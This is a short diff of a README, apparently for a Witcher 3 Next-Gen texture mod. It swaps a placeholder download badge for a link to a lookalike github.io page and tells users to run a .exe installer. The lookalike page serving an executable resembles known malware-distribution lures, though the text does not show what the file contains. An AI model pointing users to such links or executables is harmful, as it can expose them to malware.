@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install the HD Reworked Project automatically into your The Witcher 3 Next-Gen directory.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://witcher-3-hd-reworked-project-nextgen.github.io/.github/)
 
 ## 📸 Overview
 ![w3-hd-reworked-nextgen](https://github.com/user-attachments/assets/775ca07b-dd16-4571-8e49-674a30a73ea1)
